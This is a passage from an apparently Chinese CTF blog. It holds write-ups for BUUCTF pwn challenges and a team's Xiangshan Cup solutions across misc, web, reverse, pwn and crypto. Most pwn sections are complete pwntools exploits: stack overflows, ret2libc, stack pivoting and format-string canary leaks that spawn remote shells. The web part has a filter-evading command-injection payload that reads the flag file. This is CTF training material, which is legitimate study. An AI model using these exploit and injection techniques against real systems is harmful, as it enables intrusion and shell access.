<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#start</span><br><span class="line"># r = process(&quot;../buu/bjdctf_2020_babystack&quot;)</span><br><span class="line">r = remote(&quot;node4.buuoj.cn&quot;,29891)</span><br><span class="line">elf = ELF(&quot;../buu/bjdctf_2020_babystack&quot;)</span><br><span class="line"></span><br><span class="line">#params</span><br><span class="line">backdoor_addr = elf.symbols[&#x27;backdoor&#x27;]</span><br><span class="line"></span><br><span class="line">#attack</span><br><span class="line">r.recvuntil(b&quot;your name:&quot;)</span><br><span class="line">r.sendline(&quot;-1&quot;)</span><br><span class="line">r.recvuntil(b&quot;name?&quot;)</span><br><span class="line">payload = b&#x27;M&#x27; * (0x10 + 8) + p64(backdoor_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>week4&amp;&amp;week5-T5</title>
    <url>/posts/95338453/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T5-ciscn-2019-c-1"><a href="#T5-ciscn-2019-c-1" class="headerlink" title="T5 ciscn_2019_c_1"></a>T5 ciscn_2019_c_1</h2><blockquote>
<p>2023-01-30WP<br>BUUCTF pwn 题<br>考点：栈溢出 ret2libc3</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>这不上一题刚做这类？直接模仿一手。。。。<br>file checksec —— 64-bit 开NX</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>运行一下看看</p>
<p><img data-src="https://pic1.zhimg.com/80/v2-8b7794a415c00fa88ea4eab73b44e060_1440w.webp"></p>
<p>再看看IDA</p>
<p><img data-src="https://img-blog.csdnimg.cn/2020082517155968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center"></p>
<p>研究了半天发现是让你加解密的<br>再看看string window 没用system和binsh<br>又发现加密函数里有gets函数，可构成栈溢出</p>
<p><img data-src="https://img-blog.csdnimg.cn/20200825172042284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center"></p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>分析  是相同的思想，这里不赘述了，大致流程就是</p>
<ol>
<li>利用一个程序已经执行过的函数去泄露它在程序中的地址，然后取末尾3个字节，去找到这个程序所使用的libc的版本</li>
<li>用同一个程序里函数的地址-libc里的函数地址即可得到偏移量</li>
<li>得到偏移量后就可以推算出程序中其他函数的地址，知道其他函数的地址之后就可以去执行system（’&#x2F;bin&#x2F;sh‘）</li>
</ol>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>写exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line"></span><br><span class="line">p=remote(&#x27;node4.buuoj.cn&#x27;,28342)</span><br><span class="line">elf=ELF(&#x27;./ciscn_2019_c_1&#x27;)</span><br><span class="line"></span><br><span class="line">main=0x400b28</span><br><span class="line">pop_rdi=0x400c83</span><br><span class="line">ret=0x4006b9</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">payload=&#x27;\0&#x27;+&#x27;a&#x27;*(0x50-1+8)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;encrypted\n&#x27;,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\0&#x27;))</span><br><span class="line">print hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(&#x27;puts&#x27;)</span><br><span class="line">binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">system=offset+libc.dump(&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line"></span><br><span class="line">payload=&#x27;\0&#x27;+&#x27;a&#x27;*(0x50-1+8)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(binsh)</span><br><span class="line">payload+=p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;encrypted\n&#x27;,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/lieanu/LibcSearcher">libcsearch</a>的github网址<br>安装</p>
<blockquote>
<p>git clone <a href="https://github.com/lieanu/LibcSearcher.git">https://github.com/lieanu/LibcSearcher.git</a><br>cd LibcSearcher<br>sudo python setup.py develop</p>
</blockquote>
<p>覆盖数据payload&#x3D;b’\0’+b’a’*(0x50-1+8)<br>\0是为了让加密函数的一个strlen函数停止（这个函数遇‘0’会停止），从而绕过加密，保证我们构造的rop不会被破坏，<br>buf的大小为0x50<br>-1是减去\0<br>+8是覆盖rbp</p>
<p>这道题的接收非常讲究<br>泄露地址接收时先是两下recvline()，<br>原因</p>
<blockquote>
<p>recvline()一次接收到\n;<br>第一次recvline只能到Ciphertext；<br>第二次只能接收到0a<br>第三次的recvuntil才开始处理泄露的got地址。<br>先开一下context_log_lever&#x3D;’debug’，整体看一下， 再自己recvuntil看能接收到什么内容。</p>
</blockquote>
<p>然后再用recvuntil(‘\n’)[:-1].ljust(8,’\0’)来舍弃接收到的字符串最后的’\x0’并向左补齐</p>
<p>还有<br>这一道题是64位的程序，这边涉及到64位程序和32位程序运行时的区别了<br>32位程序运行执行指令的时候直接去内存地址寻址执行<br>64位程序则是通过寄存器来传址，寄存器去内存寻址，找到地址返回给程序<br>因此要用寄存器存参<br>（为什么呢？？还是不理解啊）<br><img data-src="https://pic2.zhimg.com/80/v2-64d98b53873c335d7f889b202b92fb9d_1440w.webp"></p>
<p>注意栈对齐<br><img data-src="https://pic1.zhimg.com/80/v2-5fb909989f2a46201c004e96d46f6890_1440w.webp"><br>虽然我不懂为什么要……</p>
<p>还有<br>最后为什么还要再输一个0呢？</p>
<p><img data-src="https://pic2.zhimg.com/80/v2-ffa2e57740c5b5b7047a9a03f3183039_1440w.webp"></p>
<p>搞不懂了    <strong>求助</strong></p>
<p>其实做这题主要还是模仿大佬们写的exp，好多细节都不清楚，但是感觉做了那么久又不能扔在那边等完全懂了再写题解    <del>感觉好浪费</del><br>还得再研究啊 </p>
<p>参考资料：<br>  <a href="http://t.csdn.cn/m6si5">[BUUCTF]PWN6——ciscn_2019_c_1</a></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>HASHTEAM香山杯WP</title>
    <url>/posts/2611e12a/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本wp是队友们共同努力的结果，感谢大家。</p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>将题目所给编码丢入赛博大厨，得到类似凯撒密码的字符串。</p>
<p><img data-src="https://s2.loli.net/2023/10/15/CcQBj3qFVfG4por.png" alt="image-20231015173916142.png"></p>
<p>因为flag格式第一个是f，则可以确定凯撒的偏移，得到flag。</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="PHP-unserialize-pro"><a href="#PHP-unserialize-pro" class="headerlink" title="PHP_unserialize_pro"></a>PHP_unserialize_pro</h2><p>查看源码，很显然就是一个反序列化利用。</p>
<p><img data-src="https://s2.loli.net/2023/10/15/5mISwDTexlO9PpL.png"></p>
<p>但是过滤了f l a g * ?，需要绕过。这里首先使用<code>dir -1 /</code>查看flag位置，发现是在第五个。<br><img data-src="https://s2.loli.net/2023/10/16/QK4y5GvgnJfXl8h.png"><br>然后使用<code>rev /$(dir -l / | sed -n 5p)</code>读取flag。<br><img data-src="https://s2.loli.net/2023/10/16/WgVm8jUzdBN6fGO.png"><br>得到一个反向flag。</p>
<p>再次反向得到flag。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">~/ctf/match/xsb2023/web » rev flag                                                                                            N1nE@N1nEmAn</span><br><span class="line">flag&#123;8bab51a8-191e-4e78-8ca4-f1fc3fb6c018&#125;</span><br></pre></td></tr></table></figure>



<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="URL从哪儿来"><a href="#URL从哪儿来" class="headerlink" title="URL从哪儿来"></a>URL从哪儿来</h2><p>运行题目所给的附件，设置断点在”ou.exe”所在处。在相应文件夹找到ou.exe的相关文件，然后拖入ida。<img data-src="https://s2.loli.net/2023/10/15/okIht1KHN2BYnJG.png"></p>
<p>运行ou.exe文件，发现在v18 +&#x3D; strlen(v18)处下断点，搜索flag可以得到flag。<img data-src="https://s2.loli.net/2023/10/15/EN1HQ9wIjrxizyL.png"></p>
<h2 id="hello-python"><a href="#hello-python" class="headerlink" title="hello python"></a>hello python</h2><p>了解到是python写的apk，定位所有与组件无关的后发现app.imy文件(用zip可以打开)，打开是个xxtea，直接解密即可。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">shift</span>(<span class="params">z, y, x, k, p, e</span>):</span><br><span class="line">    <span class="keyword">return</span> ((((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((x ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    n = <span class="built_in">len</span>(v)</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    z = v[n - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        x = (x + delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            y = v[p + <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] + shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            z = v[p]</span><br><span class="line">        p += <span class="number">1</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        v[n - <span class="number">1</span>] = (v[n - <span class="number">1</span>] + shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        z = v[n - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    n = <span class="built_in">len</span>(v)</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    x = (rounds * delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            y = v[p]</span><br><span class="line">        p -= <span class="number">1</span></span><br><span class="line">        z = v[n - <span class="number">1</span>]</span><br><span class="line">        v[<span class="number">0</span>] = (v[<span class="number">0</span>] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        x = (x - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = [<span class="number">689085350</span> ,<span class="number">626885696</span> ,<span class="number">1894439255</span> ,<span class="number">1204672445</span> ,<span class="number">1869189675</span> ,<span class="number">475967424</span> ,<span class="number">1932042439</span> ,<span class="number">1280104741</span> ,<span class="number">2808893494</span> ]</span><br><span class="line">k = [<span class="number">12345678</span> ,<span class="number">12398712</span> ,<span class="number">91283904</span> ,<span class="number">12378192</span> ]</span><br><span class="line">m = (decrypt(c, k))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(i)[<span class="number">2</span>:]).decode()[::-<span class="number">1</span>], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">--------------------------------------------------------------------</span><br></pre></td></tr></table></figure>









<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="Move"><a href="#Move" class="headerlink" title="Move"></a>Move</h2><p>一道简单的栈迁移。第一次迁移到所给的skdd之后，泄露puts函数地址，接着返回到main，由于栈已经被迁移，返回地址被篡改，此时直接输入one_shot，即可返回到one_shot的地址上，从而getshell。具体的在注释。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> evilblade <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">setup(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line"><span class="comment">#libset(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line">rsetup(<span class="string">&#x27;101.201.35.76&#x27;</span>,<span class="number">29720</span>)</span><br><span class="line">evgdb()</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x401353</span></span><br><span class="line">lv = <span class="number">0x000000000040124b</span></span><br><span class="line">pay = p64(rdi) + p64(gotadd(<span class="string">&#x27;puts&#x27;</span>)) + p64(pltadd(<span class="string">&#x27;puts&#x27;</span>))+ p64(<span class="number">0x401264</span>)<span class="comment">#泄露puts之后，返回到main</span></span><br><span class="line">sd(pay)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&#x27;ber&#x27;</span>,p32(<span class="number">0x12345678</span>))<span class="comment">#符合判断，执行溢出</span></span><br><span class="line"></span><br><span class="line">sd(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0x405098</span>)+p64(lv))<span class="comment">#溢出进行栈迁移到skdd</span></span><br><span class="line">addx = getx64(-<span class="number">7</span>,-<span class="number">1</span>)</span><br><span class="line">base = addx - <span class="number">0x80970</span></span><br><span class="line">sys = base + <span class="number">0x4f420</span></span><br><span class="line">binsh = base + <span class="number">0x1b3d88</span></span><br><span class="line">os = base + <span class="number">0x4f302</span></span><br><span class="line"><span class="comment">#输入oneshot，getshell</span></span><br><span class="line">sl(p64(os))</span><br><span class="line"><span class="comment">#sd(p32(0x12345678))</span></span><br><span class="line"><span class="comment">#sd(b&#x27;a&#x27;*0x30+p64(0x405098)+p64(lv))</span></span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x000000000040134c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401350 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401352 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040119d : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401353 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000401351 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040101a : ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="pwthon"><a href="#pwthon" class="headerlink" title="pwthon"></a>pwthon</h2><p>这道题目看起来很麻烦，实际上发现<code>app.cpython-37m-x86_64-linux-gnu.so </code>就是cpython，就是python文件编译的有cpython库和libc库的一道题。</p>
<p>手动测试，发现每次输入会返回一个一模一样 的东西，猜测有格式化字符串漏洞。结果发现真有，由此泄露canary。</p>
<p><img data-src="https://s2.loli.net/2023/10/15/TNGqlfdvkIcJwLR.png"></p>
<p>观察到so文件中有Give you ……字符串，此处即是刚才运行的函数，发现有栈溢出漏洞。</p>
<p><img data-src="https://s2.loli.net/2023/10/15/pXufcVrYDHGwyLd.png"></p>
<p>有了栈溢出和canary，那么直接打ret2libc即可。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> evilblade <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">setup(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line">rsetup(<span class="string">&#x27;39.106.48.123&#x27;</span>, <span class="number">13099</span>)</span><br><span class="line">evgdb()</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">addx = getx(-<span class="number">15</span>,-<span class="number">1</span>)</span><br><span class="line">base = addx - <span class="number">0x68b0</span></span><br><span class="line">dpx(<span class="string">&#x27;base&#x27;</span>, base)</span><br><span class="line">sl(<span class="string">b&#x27;aaaaaaaa&#x27;</span>+<span class="string">b&#x27;%p-&#x27;</span>*<span class="number">38</span>)</span><br><span class="line"></span><br><span class="line">can = getx(-<span class="number">20</span>,-<span class="number">2</span>)</span><br><span class="line">dpx(<span class="string">&#x27;canary&#x27;</span>,can)</span><br><span class="line"></span><br><span class="line">rdi = base + <span class="number">0x0000000000003f8f</span></span><br><span class="line">flag = base + <span class="number">0x013B66</span></span><br><span class="line">rsi = base + <span class="number">0x0000000000003cd9</span></span><br><span class="line">puts = base + <span class="number">0x3710</span></span><br><span class="line">read = base + <span class="number">0x3940</span></span><br><span class="line">op = base + <span class="number">0x3ae0</span></span><br><span class="line">bss = base + <span class="number">0x16a80</span></span><br><span class="line">write = base + <span class="number">0x3760</span></span><br><span class="line">ret = base +<span class="number">0x000000000000301a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pay=(b&#x27;aaaaaaaa&#x27;*0x20+p64(can)*3+p64(rdi)+p64(binsh)+p64(puts))</span></span><br><span class="line">pay=(<span class="string">b&#x27;aaaaaaaa&#x27;</span>*<span class="number">0x20</span>+p64(can)*<span class="number">3</span>+p64(rdi)+p64(base+<span class="number">0x016078</span>)+p64(puts)+p64(base + <span class="number">0x99f0</span>))</span><br><span class="line"></span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line">libc = tet()</span><br><span class="line">libc = getx64(<span class="number">0</span>,-<span class="number">1</span>) - <span class="number">0x80970</span></span><br><span class="line">dpx(<span class="string">&#x27;libcbase&#x27;</span>, libc)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pay=(<span class="string">b&#x27;aaaaaaaa&#x27;</span>*<span class="number">0x20</span>+p64(can)*<span class="number">3</span>+p64(rdi)+p64(libc + <span class="number">0x1b3d88</span>)+p64(ret)+p64(libc + <span class="number">0x4f420</span>)+p64(<span class="number">0xdeadbaef</span>))</span><br><span class="line"></span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>





<p>参考文章补充一下，实在不知道怎么调试。打灰盒好累hhh。</p>
<p><a href="https://www.cnblogs.com/ve1kcon/p/17766267.html">https://www.cnblogs.com/ve1kcon/p/17766267.html</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">Pwthon</span><br><span class="line"></span><br><span class="line">python pwn？实际上也是去跑 c 程序，不过还是第一次见。封装了一个 so 库，在 python 代码中会去调用这个库的函数，这样的话，相比起常规 pwn 题，就是会不好去调试。将库文件丢进 ida 分析，表面很复杂，有种做 vm 题的感觉（bushi</span><br><span class="line"></span><br><span class="line">实际上在第一个输入点输入<span class="number">0</span>就能进入到 __pyx_f_3app_Welcome2Pwnthon 函数了，存在格式化字符串漏洞和栈溢出，而且直接给了 _pyx_f_3app_get_info 函数的地址，就能去计算这个库程序的基地址了，先泄 canary，后面就是 ret2libc 来 getshell 了</span><br><span class="line"></span><br><span class="line">image</span><br><span class="line"></span><br><span class="line">比较特别的点就是 __printf_chk 函数相较于普通的 printf 函数，不能使用 %N$ 的形式泄数据，然后格式化字符串的偏移是<span class="number">5</span></span><br><span class="line"></span><br><span class="line">（刚开始发现在上图中第一个 read 处直接敲个回车或者发送刚好 <span class="number">0x100</span> 字节的数据过去之后都能泄点栈数据出来，比赛做这道题时琢磨了挺久这些数据能怎么用，因为当时没配通本地运行环境，也不知道泄出的是什么数据，然后后面倒是没用上这些数据</span><br><span class="line"></span><br><span class="line">赛后折腾了下运行环境，要和他生成 .so 用的 python3<span class="number">.7</span> 版本一样才能运行，这样添加一下 syspath 就能直接 <span class="keyword">import</span> app 了，在脚本中连gdb调试的话是这样写</span><br><span class="line"></span><br><span class="line">gdb.debug([<span class="string">&#x27;python&#x27;</span>,<span class="string">&#x27;main.py&#x27;</span>])</span><br><span class="line"></span><br><span class="line">断点断在 PyImport_ImportModule+<span class="number">4</span>，然后一直往下运行看看那个包导入了 .so</span><br><span class="line"></span><br><span class="line">exp 如下</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">p = remote(<span class="string">&#x27;101.201.35.76&#x27;</span>, <span class="number">20611</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">s = p.recv(<span class="number">12</span>)</span><br><span class="line">get_info_addr = <span class="built_in">int</span>(s,<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;get_info_addr: &quot;</span> + <span class="built_in">hex</span>(get_info_addr))</span><br><span class="line">libc_base = get_info_addr - <span class="number">0x68B0</span></span><br><span class="line">log.info(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5+(0x118-0x10)/0x8</span></span><br><span class="line">payload = <span class="string">&#x27;%p&#x27;</span>*<span class="number">37</span> + <span class="string">&#x27;flag&#x27;</span> + <span class="string">&#x27;%p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">leak_canary = p.recv(<span class="number">16</span>)</span><br><span class="line">leak_canary = <span class="built_in">int</span>(leak_canary,<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&#x27;leak_canary: &#x27;</span> + <span class="built_in">hex</span>(leak_canary))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x3f8f</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x3cd9</span></span><br><span class="line">main = libc_base + <span class="number">0x99F0</span></span><br><span class="line">puts_plt = libc_base + <span class="number">0x3710</span></span><br><span class="line">puts_got = libc_base + <span class="number">0x16078</span></span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&#x27;a&#x27;</span>*<span class="number">0x108</span> + p64(leak_canary) + <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base2 = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;libc_base2: &#x27;</span> + <span class="built_in">hex</span>(libc_base2))</span><br><span class="line">binsh = libc_base2 + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system = libc_base2 + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = libc_base + <span class="number">0x9A93</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x108</span> + p64(leak_canary) + <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="strange-hash"><a href="#strange-hash" class="headerlink" title="strange_hash"></a>strange_hash</h2><p>注意到没验证num tuple长度，直接求逆问题然后在得到的三元组后加一位0就行。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p = <span class="number">18446744073709551557</span></span><br><span class="line">M = [[<span class="number">8</span>, <span class="number">56</span>, <span class="number">280</span>], [<span class="number">18446744073709551543</span>, <span class="number">18446744073709551467</span>, <span class="number">18446744073709551123</span>], [<span class="number">7</span>, <span class="number">35</span>, <span class="number">155</span>]]</span><br><span class="line">ConInv = [<span class="number">0x39a3f978106bac2d</span>,<span class="number">0x2940e055f4a33725</span>,<span class="number">0xfda9a7a293fb5bc9</span>]</span><br><span class="line">Con = [[<span class="number">0x9c52c2de7a9373c4</span>,<span class="number">0xf2135cb886d0fa21</span>,<span class="number">0x957df7f3cd4879e9</span>], [<span class="number">0xd54f837d2738d717</span>,<span class="number">0x400ddf1ffaae436d</span>,<span class="number">0xc2abb601d9a26b07</span>], [<span class="number">0x1904359f1deb3495</span>,<span class="number">0xc21aa09ba52b157b</span>,<span class="number">0x3d45525db1b19a0c</span>], [<span class="number">0xed66cf26a65afc73</span>,<span class="number">0x1cee569b29ffa476</span>,<span class="number">0x3da45abf4304849</span>], [<span class="number">0x1c1a642fa0f3d96d</span>,<span 